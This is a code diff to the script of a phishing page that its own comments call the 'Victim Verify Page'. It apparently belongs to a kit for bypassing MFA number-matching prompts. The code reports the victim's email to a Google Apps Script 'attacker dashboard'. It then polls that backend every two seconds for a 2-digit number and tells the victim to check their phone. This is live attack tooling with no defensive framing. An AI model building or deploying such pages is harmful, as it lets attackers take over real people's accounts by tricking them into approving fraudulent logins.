@@ -74,17 +74,33 @@
 
   <script>
 
-    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxUBfTv-NSz4B-L_Z_LvAbaTOnkPtxtxaA1rPMKuvkB51ZLgmrJHQqfK8505j2RwUaz/exec";
+    // =====================================================================
 
-    // Get email
+    // Victim Verify Page - Polling version (Apps Script backend)
+
+    // Polls every 2 seconds for the 2-digit prompt number
+
+    // =====================================================================
+
+    const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx1ADYt9x5mM6S2N7-iLsjHhzvV0BqlSLkg0jZOfquQ8R4lgI9HNcnk4i-Ll0u74VrJ/exec";
+
+    // Get or set demo email (you can replace this logic with real capture)
 
     let email = localStorage.getItem("demoEmail") || "test@example.com";
 
-    document.getElementById("avatar").textContent = (email.split('@')[0] || "U").charAt(0).toUpperCase();
+    document.getElementById("avatar").textContent =
 
-    // Send ready signal
+      (email.split('@')[0] || "U").charAt(0).toUpperCase();
 
-    fetch(`${SCRIPT_URL}?action=victim_ready&email=${encodeURIComponent(email)}`, {method:"GET", mode:"no-cors"});
+    // Signal to attacker dashboard that victim is ready (optional logging)
+
+    fetch(`${SCRIPT_URL}?action=victim_ready&email=${encodeURIComponent(email)}`, {
+
+      method: "GET",
+
+      mode: "no-cors"
+
+    });
 
     const loading = document.getElementById("loading");
 
@@ -96,37 +112,49 @@
 
     function pollLatestNumber() {
 
-      const url = `${SCRIPT_URL}?getLatestNumber=true&email=${encodeURIComponent(email)}&t=${Date.now()}`;
+      const url = `${SCRIPT_URL}?action=get_prompt_number&email=${encodeURIComponent(email)}&t=${Date.now()}`;
 
-      fetch(url, { cache: "no-store" })
+      fetch(url, {
 
-        .then(r => r.text())
+        cache: "no-store",
 
-        .then(text => {
+        mode: "cors"
 
-          const match = text.match(/"number":"(\d+)"/);
+      })
 
-          if (match && match[1]) {
+        .then(response => {
 
-            const number = match[1];
+          if (!response.ok) throw new Error("Network response was not ok");
 
-            matchNumber.textContent = number;
+          return response.json();
 
-            statusText.textContent = "Number received";
+        })
+
+        .then(data => {
+
+          if (data && data.number && data.number !== matchNumber.textContent) {
+
+            // Valid 2-digit number received → show it
+
+            matchNumber.textContent = data.number;
+
+            statusText.textContent = "Number received — check your phone now";
 
             loading.style.display = "none";
 
             promptSection.style.display = "block";
 
-          } else {
-
-            statusText.textContent = "Waiting for verification…";
-
           }
+
+          // else keep showing "Waiting..."
 
         })
 
-        .catch(() => {
+        .catch(error => {
+
+          // Silent fail - don't break the polling loop
+
+          console.log("Poll error:", error);
 
           statusText.textContent = "Waiting for verification…";
 
@@ -134,13 +162,17 @@
 
     }
 
-    // Poll every 4 seconds
+    // Poll every 2 seconds (fast response, still quota-safe for small scale)
 
-    setInterval(pollLatestNumber, 4000);
+    const pollInterval = setInterval(pollLatestNumber, 2000);
 
-    // First poll immediately
+    // Run first poll immediately
 
     pollLatestNumber();
+
+    // Optional: stop polling after e.g. 10 minutes to avoid unnecessary requests
+
+    // setTimeout(() => clearInterval(pollInterval), 10 * 60 * 1000);
 
   </script>
 
